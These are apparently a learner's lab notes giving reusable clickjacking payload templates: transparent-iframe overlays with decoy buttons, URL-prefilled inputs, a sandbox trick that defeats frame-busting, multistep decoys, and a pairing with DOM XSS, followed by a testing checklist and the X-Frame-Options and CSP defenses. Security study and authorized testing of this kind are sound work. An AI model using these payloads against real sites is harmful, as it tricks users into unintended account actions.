# Combined Clickjacking Payload

## Purpose

Reusable template for combining the main clickjacking techniques covered in the labs and notes.

This file is intended as a reference template for authorized testing.

---

# Basic Structure

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    .decoy {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div class="decoy">Click me</div>

<iframe src="https://TARGET"></iframe>
```

---

# With Prefilled Input

If the authorized target uses a URL parameter to prepopulate a form:

```html
<iframe
    src="https://TARGET/PATH?PARAMETER=VALUE">
</iframe>
```

Example:

```html
<iframe
    src="https://TARGET/my-account?email=test@example.com">
</iframe>
```

Only use this pattern after confirming that the target application actually supports the parameter.

---

# With iframe Sandbox

For authorized testing of client-side frame-busting behavior:

```html
<iframe
    src="https://TARGET"
    sandbox="allow-forms">
</iframe>
```

The specific lab technique relies on restricting top-level navigation while retaining form functionality.

Do not add:

```text
allow-top-navigation
```

when testing this behavior.

---

# Multistep Structure

```html
<div class="decoy-one">Continue</div>

<div class="decoy-two">Confirm</div>

<iframe src="https://TARGET"></iframe>
```

Example CSS:

```css
.decoy-one {
    position: absolute;
    top: 200px;
    left: 100px;
    z-index: 1;
}

.decoy-two {
    position: absolute;
    top: 300px;
    left: 100px;
    z-index: 1;
}
```

The positions must correspond to the target controls in each application state.

---

# DOM XSS Combination

When an authorized target contains a DOM XSS vulnerability requiring a user interaction:

```text
Frameable Target
       +
DOM XSS
       +
Required Interaction
       ↓
Clickjacking + DOM XSS
```

The iframe template remains:

```html
<iframe src="https://TARGET"></iframe>
```

The vulnerable DOM XSS source, sink, and required interaction must be identified separately.

---

# Alignment Version

Use partial opacity while developing:

```css
opacity: 0.1;
```

Example:

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    .decoy {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div class="decoy">Click me</div>

<iframe src="https://TARGET"></iframe>
```

---

# Final Version

After the target control has been correctly aligned:

```css
opacity: 0.0001;
```

Example:

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    .decoy {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div class="decoy">Click me</div>

<iframe src="https://TARGET"></iframe>
```

---

# Combined Testing Workflow

```text
Identify Target
      ↓
Identify Sensitive Action
      ↓
Check X-Frame-Options
      ↓
Check CSP frame-ancestors
      ↓
Confirm Frameability
      ↓
Identify URL-Controlled Input
      ↓
Identify Frame-Busting Behavior
      ↓
Identify Required User Interaction
      ↓
Create iframe
      ↓
Create Decoy
      ↓
Align Target
      ↓
Test With opacity: 0.1
      ↓
Verify Interaction
      ↓
Test Additional Steps
      ↓
Reduce Opacity
      ↓
Verify Complete Chain
```

---

# Combined Mental Model

```text
                 Clickjacking
                      │
        ┌─────────────┼─────────────┐
        ↓             ↓             ↓
   Basic iframe   Prefilled     Multistep
                  input
        │             │             │
        └─────────────┼─────────────┘
                      ↓
               Victim Interaction
                      ↓
               Target Action
```

Optional combinations include:

```text
Clickjacking + CSRF-Protected Action
Clickjacking + Prefilled Form
Clickjacking + Frame-Busting Behavior
Clickjacking + DOM XSS
Clickjacking + Multistep Workflow
```

---

# Testing Checklist

```text
☐ Target is authorized
☐ Sensitive action identified
☐ Target is authenticated where required
☐ X-Frame-Options checked
☐ CSP checked
☐ frame-ancestors checked
☐ Actual framing behavior verified
☐ URL parameters tested where relevant
☐ Frame-busting behavior inspected
☐ DOM XSS checked where relevant
☐ Required interaction identified
☐ iframe created
☐ Decoy created
☐ Target aligned
☐ Partial opacity used during testing
☐ Complete interaction verified
☐ Final opacity configured
☐ Impact documented
```

---

# Defensive Controls

The main defenses covered in this topic are:

```http
X-Frame-Options: DENY
```

or:

```http
X-Frame-Options: SAMEORIGIN
```

and:

```http
Content-Security-Policy: frame-ancestors 'none';
```

or:

```http
Content-Security-Policy: frame-ancestors 'self';
```

When external framing is genuinely required, restrict `frame-ancestors` to the minimum trusted origins.

---

# Key Learning

The individual techniques can be combined, but each component must be verified independently.

The core requirement remains:

```text
Frameable Target
      +
Sensitive Interaction
      +
Victim Interaction
      ↓
Potential Clickjacking
```

Additional weaknesses such as prefilled inputs, frame-busting behavior, DOM XSS, or multistep workflows can increase complexity or impact when the complete chain is demonstrably exploitable.